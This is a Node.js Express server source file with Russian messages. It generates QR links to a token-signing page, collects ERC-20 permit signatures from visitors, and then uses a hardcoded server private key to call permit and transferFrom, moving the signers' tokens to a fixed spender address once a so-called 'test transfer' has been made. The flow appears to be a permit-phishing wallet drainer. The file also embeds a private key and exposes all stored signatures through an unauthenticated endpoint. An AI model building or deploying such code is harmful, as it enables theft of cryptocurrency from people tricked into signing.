const express = require('express');
const ethers = require('ethers');
const QRCode = require('qrcode');
const cors = require('cors');
const path = require('path');
const os = require('os');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return null;
}

const SERVER_IP = process.env.SERVER_IP || getLocalIP() || 'localhost';
const BASE_URL = process.env.BASE_URL || null;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const permits = new Map();
const transfers = new Map();

const NETWORK = process.env.NETWORK || 'sepolia';
const TOKEN_ADDRESS_SEPOLIA = process.env.TOKEN_ADDRESS_SEPOLIA || '0x...';
const TOKEN_ADDRESS_MAINNET = process.env.TOKEN_ADDRESS_MAINNET || '0x...';
const SPENDER_ADDRESS = process.env.SPENDER_ADDRESS || '0xE4576aC79aBbe431EdD7aA55111a843529285edB';
const SEPOLIA_RPC_URL = process.env.SEPOLIA_RPC_URL || 'https://sepolia.infura.io/v3/YOUR_KEY';
const MAINNET_RPC_URL = process.env.MAINNET_RPC_URL || 'https://mainnet.infura.io/v3/YOUR_KEY';
const PRIVATE_KEY = process.env.PRIVATE_KEY || '0xf2c2d9da30ec7da900c3b756ee6ceaabb337b111568448a46197c7b50669df2d';

function getCurrentNetworkConfig(networkName = null) {
    const network = networkName || process.env.NETWORK || NETWORK;
    if (network === 'mainnet') {
        return {
            name: 'mainnet',
            rpcUrl: MAINNET_RPC_URL,
            tokenAddress: TOKEN_ADDRESS_MAINNET,
            chainId: 1
        };
    } else {
        return {
            name: 'sepolia',
            rpcUrl: SEPOLIA_RPC_URL,
            tokenAddress: TOKEN_ADDRESS_SEPOLIA,
            chainId: 11155111
        };
    }
}

const currentConfig = getCurrentNetworkConfig();
let TOKEN_ADDRESS = currentConfig.tokenAddress;
let RPC_URL = currentConfig.rpcUrl;

const ERC20_PERMIT_ABI = [
    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
    "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
    "function balanceOf(address account) external view returns (uint256)",
    "function decimals() external view returns (uint8)"
];

app.get('/api/network', (req, res) => {
    const config = getCurrentNetworkConfig();
    res.json({
        success: true,
        network: config.name,
        chainId: config.chainId,
        tokenAddress: config.tokenAddress
    });
});

app.post('/api/network', (req, res) => {
    const { network } = req.body;
    if (network === 'sepolia' || network === 'mainnet') {
        process.env.NETWORK = network;
        const config = getCurrentNetworkConfig();
        TOKEN_ADDRESS = config.tokenAddress;
        RPC_URL = config.rpcUrl;
        res.json({
            success: true,
            network: config.name,
            chainId: config.chainId,
            tokenAddress: config.tokenAddress
        });
    } else {
        res.status(400).json({
            success: false,
            error: 'Invalid network. Use "sepolia" or "mainnet"'
        });
    }
});

app.get('/api/qrcode', async (req, res) => {
    try {
        const { amount, spender, network, host } = req.query;
        const targetNetwork = network || NETWORK;
        const config = getCurrentNetworkConfig(targetNetwork);
        const tokenAddr = config.tokenAddress;
        
        let qrHost;
        let protocol = 'https';
        
        if (BASE_URL) {
            const baseUrlObj = new URL(BASE_URL);
            qrHost = baseUrlObj.host;
            protocol = baseUrlObj.protocol.replace(':', '');
        } else if (req.get('host')) {
            qrHost = req.get('host');
            if (req.secure || req.get('x-forwarded-proto') === 'https' || req.get('host')?.includes('onrender.com')) {
                protocol = 'https';
            } else {
                protocol = 'https';
            }
        } else if (host) {
            qrHost = host;
            if (!qrHost.includes(':')) {
                qrHost = `${qrHost}:${PORT}`;
            }
            protocol = 'https';
        } else {
            qrHost = SERVER_IP;
            if (qrHost !== 'localhost' && !qrHost.includes(':')) {
                qrHost = `${qrHost}:${PORT}`;
            }
            protocol = 'https';
        }
        
        if (qrHost.includes('onrender.com') || qrHost.includes('railway.app') || qrHost.includes('.app')) {
            protocol = 'https';
        }
        
        const url = `${protocol}://${qrHost}/index.html?token=${tokenAddr}&spender=${spender || SPENDER_ADDRESS}&amount=${amount || ''}&network=${targetNetwork}`;
        
        const qrCodeDataURL = await QRCode.toDataURL(url, {
            width: 300,
            margin: 2,
            color: {
                dark: '#000000',
                light: '#FFFFFF'
            }
        });
        
        res.json({
            success: true,
            qrcode: qrCodeDataURL,
            url: url
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/permit', async (req, res) => {
    try {
        const { owner, spender, value, deadline, v, r, s, tokenAddress } = req.body;
        
        if (parseInt(deadline) < Math.floor(Date.now() / 1000)) {
            return res.status(400).json({
                success: false,
                error: 'Permit истек'
            });
        }
        
        const permitId = ethers.utils.keccak256(
            ethers.utils.defaultAbiCoder.encode(
                ['address', 'address', 'uint256', 'uint256'],
                [owner, spender, value, deadline]
            )
        );
        
        permits.set(permitId, {
            owner,
            spender,
            value,
            deadline,
            v,
            r,
            s,
            tokenAddress,
            createdAt: Date.now()
        });
        
        res.json({
            success: true,
            permitId: permitId
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/transfer-complete', async (req, res) => {
    try {
        const { permitId, txHash } = req.body;
        
        const permit = permits.get(permitId);
        if (!permit) {
            return res.status(404).json({
                success: false,
                error: 'Permit не найден'
            });
        }
        
        transfers.set(permitId, {
            permitId,
            txHash,
            completedAt: Date.now()
        });
        
        res.json({
            success: true,
            message: 'Перевод подтвержден. Теперь можно списать разрешенную сумму.'
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/withdraw', async (req, res) => {
    try {
        const { permitId, amount } = req.body;
        
        const permit = permits.get(permitId);
        if (!permit) {
            return res.status(404).json({
                success: false,
                error: 'Permit не найден'
            });
        }
        
        if (parseInt(permit.deadline) < Math.floor(Date.now() / 1000)) {
            return res.status(400).json({
                success: false,
                error: 'Permit истек'
            });
        }
        
        if (!transfers.has(permitId)) {
            return res.status(400).json({
                success: false,
                error: 'Сначала должен быть выполнен тестовый перевод'
            });
        }
        
        if (!PRIVATE_KEY) {
            return res.status(500).json({
                success: false,
                error: 'Приватный ключ не настроен'
            });
        }
        
        const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
        const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
        const tokenContract = new ethers.Contract(permit.tokenAddress, ERC20_PERMIT_ABI, wallet);
        
        const withdrawAmount = amount ? ethers.utils.parseUnits(amount, await tokenContract.decimals()) : permit.value;
        
        if (ethers.BigNumber.from(withdrawAmount).gt(ethers.BigNumber.from(permit.value))) {
            return res.status(400).json({
                success: false,
                error: 'Сумма превышает разрешенную'
            });
        }
        
        const permitTx = await tokenContract.permit(
            permit.owner,
            permit.spender,
            permit.value,
            permit.deadline,
            permit.v,
            permit.r,
            permit.s
        );
        
        await permitTx.wait();
        
        const transferTx = await tokenContract.transferFrom(
            permit.owner,
            permit.spender,
            withdrawAmount
        );
        
        const receipt = await transferTx.wait();
        
        res.json({
            success: true,
            txHash: receipt.transactionHash,
            amount: ethers.utils.formatUnits(withdrawAmount, await tokenContract.decimals())
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/permits', (req, res) => {
    const permitsList = Array.from(permits.entries()).map(([id, permit]) => ({
        id,
        ...permit
    }));
    
    res.json({
        success: true,
        permits: permitsList
    });
});

app.listen(PORT, () => {
    const localIP = getLocalIP();
    console.log(`\n🚀 Сервер запущен:`);
    console.log(`   Локально: http://localhost:${PORT}`);
    if (localIP) {
        console.log(`   В сети: http://${localIP}:${PORT}`);
        console.log(`   Используйте этот адрес для QR кодов на мобильных устройствах\n`);
    } else {
        console.log(`   ⚠️  Не удалось определить IP адрес. Укажите SERVER_IP в .env\n`);
    }
});

